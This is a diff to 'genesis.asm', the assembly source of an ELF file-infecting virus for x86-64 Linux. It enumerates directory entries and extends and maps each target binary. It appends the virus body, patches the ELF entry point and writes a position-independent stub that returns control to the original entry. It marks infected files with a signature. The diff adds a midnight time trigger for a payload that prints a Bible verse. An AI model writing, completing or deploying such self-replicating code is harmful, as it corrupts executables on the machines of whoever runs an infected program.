@@ -2,15 +2,9 @@
 ;@;                                                           genesis.asm ;@;
 ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
+; assemble
 ; nasm -f elf64 genesis.asm -o genesis.o
 ; ld genesis.o -o genesis
-
-; Note: Because I'm weird I decided to use camelCase for 
-;       constants and macros. Jokes aside, for this I wanted
-;       to experiment by approaching ASM like an high-level
-;       language, thus making it *hopefully* more readable
-;       for people that are less familiar with ASM.
-;
 
 %include "src/Macros.asm"
 %include "src/Structs.asm"
@@ -86,27 +80,29 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
       jne   .NextFile                                 ; <---Next-File---'
 
       ;; EXEC PAYLOAD (PRINT STDOUT) >--------------------------------------<
+      
+      sub   rsp,  0x10                                ; alloc mem for timespec
+      ClockGetTime [rsp]
+
+      mov   eax,  [rsp]
+      add   eax,  3600                                ; adjust for CET
+      xor   edx,  edx
+      mov   ecx,  86400
+      div   ecx
+      add   rsp,  0x10                                ; free stack mem
+      test  edx,  edx
+      jnz   .NotMidnight
 
       call .Payload
     
-      .msg:    ; idk why I made it a byte array...
-        db	0x47, 0x65, 0x6e, 0x65, 0x73, 0x69, 0x73, 0x20, 0x31, 0x3a, 
-        db	0x32, 0x32, 0x20, 0x7e, 0x20, 0x47, 0x6f, 0x64, 0x20, 0x62, 
-        db	0x6c, 0x65, 0x73, 0x73, 0x65, 0x64, 0x20, 0x74, 0x68, 0x65, 
-        db	0x6d, 0x2c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x61, 0x69, 
-        db	0x64, 0x20, 0x27, 0x42, 0x65, 0x20, 0x66, 0x72, 0x75, 0x69, 
-        db	0x74, 0x66, 0x75, 0x6c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x6d, 
-        db	0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x79, 0x2c, 0x20, 0x66, 
-        db	0x69, 0x6c, 0x6c, 0x20, 0x74, 0x68, 0x65, 0x20, 0x65, 0x61, 
-        db	0x72, 0x74, 0x68, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x75, 
-        db	0x62, 0x64, 0x75, 0x65, 0x20, 0x69, 0x74, 0x27, 0x2e, 0x0a, 
-        db  0x00
+        MSG_PLACEHOLDER
         msglen equ $-.msg
 
       .Payload:
       pop   rsi
       Write STDOUT, rsi, msglen
 
+      .NotMidnight:
       Close rbx
 
       jmp   .EnumDirDone
@@ -142,7 +138,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   jne     .InfectFailureExit
   
   ; extend filesize (ftruncate)
-  xor     rbx,  rbx
+  xor     ebx,  ebx
   mov     rbx,  VExitRoutine
   mov     rax,  _start
   sub     rbx,  rax
@@ -156,7 +152,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   add     rbx,  0xFFF                               ; add page_size-1
   and     rbx,  -0x1000
 
-  xor     rsi,  rsi
+  xor     esi,  esi
   FTruncate     rdi,  rbx
   test    rax,  rax
   jne     .InfectFailureExit
@@ -177,11 +173,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   test    rax,  rax                                 ; check if mmap(...) failed
   js      .InfectFailureExit
 
-  push    rax                                       ; rsp         -> FileMap (ELF-HDR)
-                                                    ; rsp + 0x8   -> FileSz
-                                                    ; rsp + 0x10  -> Old Entry
-                                                    ; rsp + 0x18  -> Program Hdr
-                                                    ; rsp + 0x20  -> EOF
+  push    rax
 
   ;; SAVE OLD ENTRY >-------------------------------------------------------<
   
@@ -206,7 +198,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   ;; LOOP THROUGH PHDR >----------------------------------------------------<
 
-  xor     rcx,  rcx
+  xor     ecx,  ecx
   mov     rax,  [rsp]
   mov     rdx,  rax
   add     rax,  [rax + elf64_hdr.e_phoff]
@@ -266,7 +258,13 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   pop   rdi
   add   rsp,  0x8
+  
+  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
 
+  ; mov   rbx,  r10
+  add   r10,  0xc000000 ; was rbx not r10
+  mov   dword [rdx + elf64_hdr.e_entry], r10d            ; patch entry
+  
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
 
   mov   rcx,  VIRUS_SIZE                                ; rcx = size V-Body
@@ -275,30 +273,43 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   add   rbx,  [rsp + VX_CTX.qEof]
   add   rbx,  rcx
 
-  mov   byte  [rbx + 0],    0x48
-  mov   byte  [rbx + 1],    0xB8                        ; mov rax, ?? ---.
-  mov   rcx,  [rsp + VX_CTX.qOldEntry]                  ;                |
-  mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
-  mov   byte  [rbx + 10],   0xFF 
-  mov   byte  [rbx + 11],   0xE0                        ; jmp rax
-  ; # maybe -> 48 c7 c0 <OEP>.. depending if we move a 64bit or a 32bit val
-  
-  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
+  ; mov   byte  [rbx + 0],    0x48
+  ; mov   byte  [rbx + 1],    0xB8                        ; mov rax, ?? ---.
+  ; mov   rcx,  [rsp + VX_CTX.qOldEntry]                  ;                |
+  ; mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
+  ; mov   byte  [rbx + 10],   0xFF 
+  ; mov   byte  [rbx + 11],   0xE0                        ; jmp rax
 
-  mov   rbx,  r10
-  add   rbx,  0xc000000
-  mov   dword [rdx + elf64_hdr.e_entry], ebx            ; patch entry
-  
+  mov   dword   [rbx + 0],  0x000000e8  ; call $+5
+  mov   word    [rbx + 4],  0x5800      ; pop rax   ; rax = RIP
+  mov   word    [rbx + 6],  0x2d48
+  add   rcx,    0x5                     ; <-- prob needs adjustment lol
+  mov   dword   [rbx + 8],  ecx         ; sub rax, vx_size + 5
+  mov   word    [rbx + 12], 0x2d48
+  mov   dword   [rbx + 14], r10d        ; sub rax, new_entry
+  mov   word    [rbx + 18], 0x0548
+  mov   rcx,    [rsp + VX_CTX.qOldEntry]
+  mov   dword   [rbx + 20], ecx         ; add rax, old_entry
+  mov   word    [rbx + 24], 0xe0ff      ; jmp rax
+
+  ; --> GET OEP DESPITE PIE <-----------------------------------------------< 
+  ; call  $+5             ; e8 00 00 00 00    ; 
+  ; pop   rax             ; 58                ; rax = RIP
+  ; sub   rax, 0x???????? ; 48 2d ?? ?? ?? ?? ; VX_SIZE + 5, known statically
+  ; sub   rax, 0x???????? ; 48 2d ?? ?? ?? ?? ; new entry (make sure to patch below so r10 += 0xc000000)
+  ; add   rax, 0x???????? ; 48 05 ?? ?? ?? ?? ; rax += VX_CTX.qOldEntry
+  ; jmp   rax             ; ff e0             ; 
+
   ;; WRITE SIGNATURE >------------------------------------------------------<
   
-  mov   dword [rdx + 0xC], 0x534e4700
+  mov   dword [rdx + 0xc], 0x534e4700
 
   ;; OVERWRITE FILE >-------------------------------------------------------<
 
   sub   rsp,  0x8
   push  rdi
 
-  MSync rdx,  [rsp + VX_CTX.qFileSize - 0x10], MS_SYNC     ; msync(addr, len, MS_SYNC)
+  MSync rdx,  [rsp + VX_CTX.qFileSize - 0x10], MS_SYNC  ; msync(addr, len, MS_SYNC)
 
   pop   rdi
   add   rsp,  0x8
@@ -307,20 +318,20 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   js    .InfectCleanUp
 
   ; fsync(fd) - just to make sure
-  FSync rdi                                               ; fsync(fd)
+  FSync   rdi                                           ; fsync(fd)
 
-  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]                 ; free mapped file
+  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]               ; free mapped file
 
-  xor     rax,  rax                                       ; return 0
+  xor     eax,  eax                                     ; return 0
   mov     rsp,  rbp
   pop     rbp
   ret
 
   .InfectCleanUp:
-  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]                 ; free mapped file
+  MUnMap  [rsp], [rsp + VX_CTX.qFileSize]               ; free mapped file
 
   .InfectFailureExit:
-  xor     rax,  rax                                       ; return 1
+  xor     eax,  eax                                     ; return 1
   inc     rax
   mov     rsp,  rbp
   pop     rbp
